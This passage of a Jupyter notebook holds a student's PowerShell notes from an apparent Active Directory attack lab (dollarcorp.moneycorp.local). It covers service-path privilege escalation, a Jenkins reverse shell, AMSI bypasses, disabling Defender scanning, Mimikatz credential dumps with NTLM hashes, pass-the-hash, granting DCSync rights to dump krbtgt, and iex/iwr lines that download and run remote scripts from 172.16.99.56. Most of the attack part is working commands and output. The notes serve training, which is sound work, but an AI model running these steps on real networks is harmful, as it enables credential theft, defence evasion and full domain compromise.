        "Get-NetDomainTrust\n",
        "# Learn that a bidirectional trust exists between dollarcorp.moneycorp.local and eurocorp.local\n",
        "# eurocorp.local is another forest\n",
        "\n",
        "# Forest Domain Information for eurocorp.local\n",
        "Get-NetForestDomain -Verbose -Forest eurocorp.local | Get-NetDomainTrust\n",
        "# Learn that eurocorp.local has a child domain that is eu.eurocorp.local"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Additional information from Day 1"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Find machines on the current domain where the current user has local admin access\n",
        "Find-LocalAdminAccess -Verbose\n",
        "\n",
        "# Other methods to find local admin access\n",
        "Find-WMILocalAdminAccess.ps1 and Find-PSremotingLocalAdminAccess.ps1\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Day 2\n",
        "\n",
        "50 minutes into day 2"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Privilege Escalation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Find PSRemoting Local Admin Access\n",
        "Find-PSremotingLocalAdminAccess\n",
        "# Returns that the student user has localadminaccess on dcorp-adminsrv\n",
        "\n",
        "# Identify Missing Patches\n",
        "## If you want to use powershell to check for updates\n",
        "$UpdateSession = New-Object -ComObject Microsoft.Update.Session\n",
        "$UpdateSearcher = $UpdateSession.CreateupdateSearcher()\n",
        "$Updates = @($UpdateSearcher.Search(\"IsHidden=0 and IsInstalled=0\").Updates)\n",
        "$Updates \n",
        "\n",
        "# Automated deployment and Autologon passwords in clear text\n",
        "\n",
        "# Misconfigured Services\n",
        "\n",
        "# DLL Hijacking and more\n",
        "\n",
        "## Tools to use:\n",
        "# PowerUp - Part of PowerShellMafia PowerSploit project\n",
        "# BeRoot by AlessandroZ\n",
        "# Privesc by enjoiz"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Service Misconfiguration (Privilege Escalation)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Find Services that allow for modifying the path to execute a command of choice\n",
        "Get-ServiceUnquoted -Verbose\n",
        "<# Output shows the vulnerabilities and how to exploit...\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "\n",
        "ServiceName    : AbyssWebServer\n",
        "Path           : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiablePath : @{ModifiablePath=C:\\WebServer; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\n",
        "StartName      : LocalSystem\n",
        "AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>\n",
        "CanRestart     : True\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "ServiceName    : AbyssWebServer\n",
        "Path           : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiablePath : @{ModifiablePath=C:\\WebServer; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\n",
        "StartName      : LocalSystem\n",
        "AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>\n",
        "CanRestart     : True\n",
        "\n",
        "#>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Services where the user can write to its binary path or change arguments\n",
        "Get-ModifiableServiceFile -Verbose\n",
        "\n",
        "<#\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "\n",
        "ServiceName                     : AbyssWebServer\n",
        "Path                            : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiableFile                  : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "ModifiableFilePermissions       : AppendData/AddSubdirectory\n",
        "ModifiableFileIdentityReference : BUILTIN\\Users\n",
        "StartName                       : LocalSystem\n",
        "AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'\n",
        "CanRestart                      : True\n",
        "\n",
        "VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer\n",
        "ServiceName                     : AbyssWebServer\n",
        "Path                            : C:\\WebServer\\Abyss Web Server\\WebServer\\abyssws.exe --service\n",
        "ModifiableFile                  : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "ModifiableFilePermissions       : WriteData/AddFile\n",
        "ModifiableFileIdentityReference : BUILTIN\\Users\n",
        "StartName                       : LocalSystem\n",
        "AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'\n",
        "CanRestart                      : True\n",
        "#>\n",
        "\n",
        "# Services whose configuration the current user can modify\n",
        "Get-ModifiableService -Verbose\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 5\n",
        "````\n",
        "Exploit a service on dcorp-studentx and elevate privileges to local administrator\n",
        "Identify a machine in the domain where studentx has local administrative access\n",
        "Using privileges of a user on Jenkins on 172.16.3.11:8080 get admin privileges on 172.16.3.11 - the dcorp-ci server\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "Get-PathAcl -Path 'C:\\WebServer\\Abyss Web Server\\WebServer'\n",
        "<# - These do not show in the display of explorer they are special permissions of \"Create files / write data and create folders / append data\"\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : Read\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : AppendData/AddSubdirectory\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "\n",
        "Path              : C:\\WebServer\\Abyss Web Server\\WebServer\n",
        "FileSystemRights  : WriteData/AddFile\n",
        "IdentityReference : BUILTIN\\Users\n",
        "IdentitySID       : S-1-5-32-545\n",
        "AccessControlType : Allow\n",
        "#>\n",
        "\n",
        "#Found a zlib1.dll that I am going to try and hijack - Did not work - Unable to move the zlib1.dll without admin privileges.  Can create files in the directory.\n",
        "# b64 encoded the file to get it to my win10 VisualStudio box\n",
        "$FileName = \"C:\\WebServer\\Abyss Web Server\\WebServer\\zlib1.dll\"\n",
        "$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))\n",
        "$base64string | Out-File b64.txt\n",
        "\n",
        "# On my other system \n",
        "$base64string = Get-Content C:\\Users\\thepcn3rd\\Desktop\\b64.txt\n",
        "[IO.File]::WriteAllBytes(\"zlib1.dll\", [Convert]::FromBase64String($base64string))\n",
        "\n",
        "# Invoke-ServiceAbuse\n",
        "# Service going to be exploited\n",
        "$serviceName = \"AbyssWebServer\"\n",
        "$info = Get-ServiceDetail -Name $serviceName\n",
        "$info.PathName\n",
        "\n",
        "# Identified that the service permissions for AbyssWebServer and SNMPTrap allowed the \"Changeconfig\" permission.  This allowed us to change\n",
        "# the path of the exe for the service.  Changed it with servicePathReplace.ps1 and the gained localadmin privileges.  Reverse engineered \n",
        "# the Get-ModifiableService and found how they did it and used and built a script called serviceTestPermissions.ps1 to assist in finding\n",
        "# vulnerabile services with that configrmation.\n",
        "#\n",
        "# Found the best way to check teh service permissions was through \"ProcessExplorer\" and viewing them in that fashion.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 6 "
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Working with Bloodhound\n",
        "# Ran amsibypass\n",
        "# Loaded teh SharpHound.ps1 into memory and executed\n",
        "# Ran Bloodhound and pulled file over to linux\n",
        "\n",
        "# Powershell copy file from remote computer to this box\n",
        "$pw = Convertto-Securestring -AsPlainText -Force -String \"vPM8JE244TRwPGhV\"\n",
        "$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist \"dcorp\\student756\",$pw\n",
        "$s = New-PSSession -Computername dcorp-std756 -Authentication Negotiate -Credential $cred\n",
        "Copy-Item -FromSession $s -Path \"C:\\users\\student756\\20210429122000_BloodHound.zip\" -Destination \"/home/kali/PentesterAcademy/AD/obj6/20210429122000_BloodHound.zip\"\n",
        "\n",
        "# Load neo4j and Bloodhound\n",
        "# sudo neo4j start\n",
        "# Bloodhound does not load with ssh x-forwarding...  Loaded through Kali\n",
        "# Uploaded the zip into bloodhound\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 7"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        "````\n",
        "\n",
        "# Created a Reverse Shell through Jenkins\n",
        "# Invoke-RShell was loaded through a http.server \n",
        "# Had to pull the v4amsi bypass down and run it manually\n",
        "# Then loaded powerview...  The invoke-userhunter did not show that the user had localadmin like in the instructions\n",
        "# Loaded Invoke-Mimikatz in memory...\n",
        "# Then executed the command through an established session \n",
        "# $s = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.Local\n",
        "# Disable On-access scanning on the target\n",
        "# Invoke-Command -ScriptBlock {Set-MPPreference -DisableIOAVProtection $true} -Session $s\n",
        "# Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $s\n",
        "\n",
        "PS C:\\Program Files (x86)\\Jenkins\\workspace\\project0> Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $s\n",
        "\n",
        "  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56\n",
        " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
        " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
        " ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
        " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
        "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
        "\n",
        "mimikatz(powershell) # sekurlsa::logonpasswords\n",
        "\n",
        "Authentication Id : 0 ; 167471 (00000000:00028e2f)\n",
        "Session           : RemoteInteractive from 2\n",
        "User Name         : mgmtadmin\n",
        "Domain            : dcorp\n",
        "Logon Server      : DCORP-DC\n",
        "Logon Time        : 1/24/2021 5:28:45 AM\n",
        "SID               : S-1-5-21-1874506631-3219952063-538504511-1121\n",
        "\tmsv :\t\n",
        "\t [00000003] Primary\n",
        "\t * Username : mgmtadmin\n",
        "\t * Domain   : dcorp\n",
        "\t * NTLM     : 95e2cd7ff77379e34c6e46265e75d754\n",
        "\t * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea\n",
        "\t * DPAPI    : b826a190021809d711368730cfc6e41d\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : mgmtadmin\n",
        "\t * Domain   : dcorp\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : mgmtadmin\n",
        "\t * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "\t * Password : (null)\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 67923 (00000000:00010953)\n",
        "Session           : Service from 0\n",
        "User Name         : svcadmin\n",
        "Domain            : dcorp\n",
        "Logon Server      : DCORP-DC\n",
        "Logon Time        : 1/24/2021 5:27:35 AM\n",
        "SID               : S-1-5-21-1874506631-3219952063-538504511-1122\n",
        "\tmsv :\t\n",
        "\t [00000003] Primary\n",
        "\t * Username : svcadmin\n",
        "\t * Domain   : dcorp\n",
        "\t * NTLM     : b38ff50264b74508085d82c69794a4d8\n",
        "\t * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9\n",
        "\t * DPAPI    : fd3c6842994af6bd69814effeedc55d3\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : svcadmin\n",
        "\t * Domain   : dcorp\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : svcadmin\n",
        "\t * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "\t * Password : (null)\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 996 (00000000:000003e4)\n",
        "Session           : Service from 0\n",
        "User Name         : DCORP-MGMT$\n",
        "Domain            : dcorp\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:27:33 AM\n",
        "SID               : S-1-5-20\n",
        "\tmsv :\t\n",
        "\t [00000003] Primary\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec\n",
        "\t * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : dcorp-mgmt$\n",
        "\t * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "\t * Password : (null)\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 22097 (00000000:00005651)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : (null)\n",
        "Domain            : (null)\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:27:33 AM\n",
        "SID               : \n",
        "\tmsv :\t\n",
        "\t [00000003] Primary\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec\n",
        "\t * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\tkerberos :\t\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 66579 (00000000:00010413)\n",
        "Session           : Service from 0\n",
        "User Name         : SQLTELEMETRY\n",
        "Domain            : NT Service\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:27:35 AM\n",
        "SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775\n",
        "\tmsv :\t\n",
        "\t [00000003] Primary\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec\n",
        "\t * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dollarcorp.moneycorp.local\n",
        "\t * Password : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 46 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c1 cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e9 f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4b 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53 \n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 997 (00000000:000003e5)\n",
        "Session           : Service from 0\n",
        "User Name         : LOCAL SERVICE\n",
        "Domain            : NT AUTHORITY\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:27:34 AM\n",
        "SID               : S-1-5-19\n",
        "\tmsv :\t\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : (null)\n",
        "\t * Domain   : (null)\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : (null)\n",
        "\t * Domain   : (null)\n",
        "\t * Password : (null)\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "Authentication Id : 0 ; 999 (00000000:000003e7)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : DCORP-MGMT$\n",
        "Domain            : dcorp\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:27:33 AM\n",
        "SID               : S-1-5-18\n",
        "\tmsv :\t\n",
        "\ttspkg :\t\n",
        "\twdigest :\t\n",
        "\t * Username : DCORP-MGMT$\n",
        "\t * Domain   : dcorp\n",
        "\t * Password : (null)\n",
        "\tkerberos :\t\n",
        "\t * Username : dcorp-mgmt$\n",
        "\t * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "\t * Password : (null)\n",
        "\tssp :\t\n",
        "\tcredman :\t\n",
        "\n",
        "````"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "````\n",
        "Mimikatz Notes\n",
        "\n",
        "# Local Admin with Powershell ISE Open\n",
        "# I have the hash of a user that belongs to the domain admin group - svcadmin\n",
        "# Launching Powershell as the svcadmin with domain admin rights\n",
        "Invoke-Mimikatz -Command '\"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe\"'\n",
        "\n",
        "# With the account entered a PS session with dcorp-mgmt\n",
        "# Viewed the accounts running services \n",
        "# Get-wmiobject win32_service | format-table name, startname\n",
        "\n",
        "# Then executed the command through an established session \n",
        "# $s = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.Local\n",
        "# Disable On-access scanning on the target\n",
        "# Invoke-Command -ScriptBlock {Set-MPPreference -DisableIOAVProtection $true} -Session $s\n",
        "# Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $s\n",
        "# The above did not work on dcorp-admin-srv\n",
        "\n",
        "# Get-Applockerpolicy -effective | select -expandproperty RuleCollections\n",
        "# - Shows that whatever is saved in the program files directory will not be constrained...\n",
        "# Enter-pssession $s\n",
        "# Navigated to the program files directory - then created a directory called output...\n",
        "# Ran the amsi bypass\n",
        "# Downloaded and executed mimikatz\n",
        "\n",
        "[dcorp-adminsrv.dollarcorp.moneycorp.Local]: PS C:\\Program Files\\output> .\\im.ps1\n",
        "\n",
        "  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56\n",
        " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
        " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
        " ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
        " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
        "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
        "\n",
        "mimikatz(powershell) # sekurlsa::logonpasswords\n",
        "\n",
        "Authentication Id : 0 ; 243388 (00000000:0003b6bc)\n",
        "Session           : RemoteInteractive from 2\n",
        "User Name         : srvadmin\n",
        "Domain            : dcorp\n",
        "Logon Server      : DCORP-DC\n",
        "Logon Time        : 1/24/2021 5:31:12 AM\n",
        "SID               : S-1-5-21-1874506631-3219952063-538504511-1115\n",
        "        msv :\n",
        "         [00000003] Primary\n",
        "         * Username : srvadmin\n",
        "         * Domain   : dcorp\n",
        "         * NTLM     : a98e18228819e8eec3dfa33cb68b0728\n",
        "         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a\n",
        "         * DPAPI    : ddce77eab64944efda38b5cfdad5395f\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : srvadmin\n",
        "         * Domain   : dcorp\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : srvadmin\n",
        "         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 69780 (00000000:00011094)\n",
        "Session           : Service from 0\n",
        "User Name         : websvc\n",
        "Domain            : dcorp\n",
        "Logon Server      : DCORP-DC\n",
        "Logon Time        : 1/24/2021 5:30:06 AM\n",
        "SID               : S-1-5-21-1874506631-3219952063-538504511-1113\n",
        "        msv :\n",
        "         [00000003] Primary\n",
        "         * Username : websvc\n",
        "         * Domain   : dcorp\n",
        "         * NTLM     : cc098f204c5887eaa8253e7c2749156f\n",
        "         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b\n",
        "         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : websvc\n",
        "         * Domain   : dcorp\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : websvc\n",
        "         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 996 (00000000:000003e4)\n",
        "Session           : Service from 0\n",
        "User Name         : DCORP-ADMINSRV$\n",
        "Domain            : dcorp\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:30:02 AM\n",
        "SID               : S-1-5-20\n",
        "        msv :\n",
        "         [00000003] Primary\n",
        "         * Username : DCORP-ADMINSRV$\n",
        "         * Domain   : dcorp\n",
        "         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96\n",
        "         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : DCORP-ADMINSRV$\n",
        "         * Domain   : dcorp\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : dcorp-adminsrv$\n",
        "         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 22308 (00000000:00005724)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : (null)\n",
        "Domain            : (null)\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:30:02 AM\n",
        "SID               :\n",
        "        msv :\n",
        "         [00000003] Primary\n",
        "         * Username : DCORP-ADMINSRV$\n",
        "         * Domain   : dcorp\n",
        "         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96\n",
        "         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        kerberos :\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 71556 (00000000:00011784)\n",
        "Session           : Service from 0\n",
        "User Name         : appadmin\n",
        "Domain            : dcorp\n",
        "Logon Server      : DCORP-DC\n",
        "Logon Time        : 1/24/2021 5:30:06 AM\n",
        "SID               : S-1-5-21-1874506631-3219952063-538504511-1117\n",
        "        msv :\n",
        "         [00000003] Primary\n",
        "         * Username : appadmin\n",
        "         * Domain   : dcorp\n",
        "         * NTLM     : d549831a955fee51a43c83efb3928fa7\n",
        "         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816\n",
        "         * DPAPI    : 7ec84538f109f73066103b9d1629f95e\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : appadmin\n",
        "         * Domain   : dcorp\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : appadmin\n",
        "         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 997 (00000000:000003e5)\n",
        "Session           : Service from 0\n",
        "User Name         : LOCAL SERVICE\n",
        "Domain            : NT AUTHORITY\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:30:03 AM\n",
        "SID               : S-1-5-19\n",
        "        msv :\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : (null)\n",
        "         * Domain   : (null)\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : (null)\n",
        "         * Domain   : (null)\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "Authentication Id : 0 ; 999 (00000000:000003e7)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : DCORP-ADMINSRV$\n",
        "Domain            : dcorp\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 1/24/2021 5:30:02 AM\n",
        "SID               : S-1-5-18\n",
        "        msv :\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "         * Username : DCORP-ADMINSRV$\n",
        "         * Domain   : dcorp\n",
        "         * Password : (null)\n",
        "        kerberos :\n",
        "         * Username : dcorp-adminsrv$\n",
        "         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n",
        "         * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "\n",
        "mimikatz(powershell) # exit\n",
        "\n",
        "````"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 12"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Loaded my common functions with http\n",
        "#iex (iwr http://172.16.99.56:8090/common.ps1)\n",
        "\n",
        "# Loaded the amsi bypass\n",
        "#Invoke-Lefty -baseName v4amsi.ps1\n",
        "\n",
        "# Loaded PowerView\n",
        "#Invoke-Lefty -baseName PowerView.ps1\n",
        "\n",
        "# Loaded Mimikatz - However it fails due to the size of the download...\n",
        "#Invoke-Lefty -baseName Invoke-Mimikatz.ps1\n",
        "\n",
        "# Gather ACLs of current user\n",
        "#Get-ObjectAcl -DistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -ResolveGUIDs | ? { ($_.IdentityReference -match \"student756\") }\n",
        "\n",
        "# Launch Powershell ISE as a Local Admin\n",
        "# Launch a domain admin powershell window with Mimikatz\n",
        "#Invoke-Mimikatz -Command '\"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe\"'\n",
        "\n",
        "# Now that I have the domain admin shell\n",
        "# Add the Object ACL to the user account for conducting a DCSync\n",
        "#Add-ObjectAcl -TargetDistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -PrincipalSamAccountName student756 -Rights DCSync -Verbose\n",
        "\n",
        "# Now run the Get-Object ACL to see that the student756 account has the right now...\n",
        "#Get-ObjectAcl -DistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -ResolveGUIDs | ? { ($_.IdentityReference -match \"student756\") }\n",
        "\n",
        "# Now with the normal user account you can conduct a DCSync\n",
        "#Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 19"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [
        {
          "data": {
            "text/plain": "'test'"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "# Use Domain Admin to escalate to Enterprise Admin\n",
        "iex (iwr http://172.16.99.56:8091/common.ps1)\n",
        "\n",
        "Invoke-Lefty -baseName v4amsi.ps1\n",
        "\n",
        "invoke-loadlocal -baseName Invoke-Mimikatz.ps1 -toolsPath C:\\users\\student756\\tools\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": []
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
